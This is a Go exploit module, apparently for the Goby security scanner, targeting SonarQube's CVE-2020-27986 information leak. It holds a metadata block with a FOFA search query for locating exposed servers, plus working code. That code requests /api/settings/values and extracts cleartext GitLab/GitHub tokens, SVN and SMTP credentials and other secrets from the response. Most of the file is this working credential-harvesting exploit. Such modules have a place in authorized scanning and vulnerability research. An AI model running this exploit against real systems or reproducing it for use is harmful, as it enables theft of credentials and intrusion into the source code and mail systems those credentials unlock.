package exploits

import (
	"encoding/json"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SonarQube Infoleak (CVE-2020-27986)",
    "Description": "SonarQube 8.4.2.36762 allows remote attackers to discover cleartext GitLab token, SVN account, SMTP account password, or other credentials via the api/settings/values URI.",
    "Impact": "SonarQube Infoleak (CVE-2020-27986)",
    "Recommendation": "<p>undefined</p>",
    "Product": "SonarQube",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "SonarQube api信息泄露",
            "Description": "Sonar 是一个用于代码质量管理的开放平台。通过插件机制，Sonar 可以集成不同的测试工具，代码分析工具，以及持续集成工具。SonarQube 8.4.2.36762允许远程攻击者通过url发现明文SMTP，SVN和GitLab等敏感信息。",
            "Impact": "<p>Sonar 是一个用于代码质量管理的开放平台。通过插件机制，Sonar 可以集成不同的测试工具，代码分析工具，以及持续集成工具。</p><p>SonarQube 8.4.2.36762允许远程攻击者通过api/settings/values URI发现明文SMTP，SVN和GitLab凭据。</p>",
            "Recommendation": "<p style=\"text-align: start;\">1、目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：<a href=\"https://sonarcloud.io/\">https://sonarcloud.io/</a><br></p><p style=\"text-align: start;\">2、<font>没有关于可能采取的对策的信息。</font><font>建议使用替代产品替换受影响的对象。</font></p>",
            "Product": "SonarQube",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "SonarQube Infoleak (CVE-2020-27986)",
            "Description": "SonarQube 8.4.2.36762 allows remote attackers to discover cleartext GitLab token, SVN account, SMTP account password, or other credentials via the api/settings/values URI.",
            "Impact": "SonarQube Infoleak (CVE-2020-27986)",
            "Recommendation": "<p>undefined</p>",
            "Product": "SonarQube",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "(body=\"content=\\\"SonarQube\" || title==\"SonarQube\") || body=\"content=\\\"SonarQube\" || title==\"SonarQube\"",
    "GobyQuery": "(body=\"content=\\\"SonarQube\" || title==\"SonarQube\") || body=\"content=\\\"SonarQube\" || title==\"SonarQube\"",
    "Author": "i_am_ben@qq.com",
    "Homepage": "https://www.sonarqube.org/",
    "DisclosureDate": "2021-06-03",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2020-27986"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2020-27986"
    ],
    "CNVD": [
        "CNVD-2020-64787"
    ],
    "CNNVD": [
        "CNNVD-202010-1588"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "SonarQube"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	mapToStr := func(mapLine map[string]string) string {
		jsonSteam, _ := json.Marshal(mapLine)
		stringSteam := string(jsonSteam)
		return stringSteam
	}
	parserResp := func(resp string) string {
		respMap := make(map[string][]map[string]string)
		json.Unmarshal([]byte(resp), &respMap)
		Gitlab_Server_Credentials_Info := "[Git_Server_Credentials_Info. Used to sign in Gitlab/GitHub]\r\n"
		SVN_Server_Credentials_Info := "[SVN_Server_Credentials_Info. Used to sign in SVN]\r\n"
		SMTP_Server_Credentials_Info := "[SMTP_Server_Credentials_Info. Used to sign in SMTP]\r\n"
		Custom_Credentials_Info := "[Custom_Credentials_Info. Used to sign in Users Custom System]\r\n"
		resultCountFlag := map[string]int{"git": 0, "svn": 0, "smtp": 0, "custom": 0}
		result := ""
		for _, value := range respMap["settings"] {
			if strings.Contains(strings.ToLower(value["key"]), "gitlab") || strings.Contains(strings.ToLower(value["key"]), "github") {
				resultCountFlag["git"] = resultCountFlag["git"] + 1
				Gitlab_Server_Credentials_Info += mapToStr(value) + "\r\n"
			} else if strings.Contains(strings.ToLower(value["key"]), "svn") {
				SVN_Server_Credentials_Info += mapToStr(value) + "\r\n"
				resultCountFlag["svn"] = resultCountFlag["svn"] + 1
			} else if strings.Contains(strings.ToLower(value["key"]), "smtp") {
				SMTP_Server_Credentials_Info += mapToStr(value) + "\r\n"
				resultCountFlag["smtp"] = resultCountFlag["smtp"] + 1
			} else if (strings.Contains(strings.ToLower(value["key"]), "secret") || strings.Contains(strings.ToLower(value["key"]), "username") || strings.Contains(strings.ToLower(value["key"]), "password") || strings.Contains(strings.ToLower(value["key"]), "token")) && (!strings.Contains(strings.ToLower(value["key"]), "gitlab") && !strings.Contains(strings.ToLower(value["key"]), "svn") && !strings.Contains(strings.ToLower(value["key"]), "smtp")) {
				Custom_Credentials_Info += mapToStr(value) + "\r\n"
				resultCountFlag["custom"] = resultCountFlag["custom"] + 1
			}
		}
		if resultCountFlag["git"] > 1 {
			result += Gitlab_Server_Credentials_Info + "\r\n"
		}
		if resultCountFlag["svn"] > 1 {
			result += SVN_Server_Credentials_Info + "\r\n"
		}
		if resultCountFlag["smtp"] > 1 {
			result += SMTP_Server_Credentials_Info + "\r\n"
		}
		if resultCountFlag["custom"] > 1 {
			result += Custom_Credentials_Info + "\r\n"
		}
		if resultCountFlag["git"] < 2 && resultCountFlag["svn"] < 2 && resultCountFlag["smtp"] < 2 && resultCountFlag["custom"] < 2 {
			result = "No credential information is currently found."
		}
		return result
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/api/settings/values"
			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + uri); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "settings")
			} else {
				return false
			}
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/api/settings/values"
			if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + uri); err == nil {
				expResult.Output = parserResp(resp.RawBody)
				expResult.Success = true
			} else {
				expResult.Success = false
			}
			return expResult
		},
	))
}
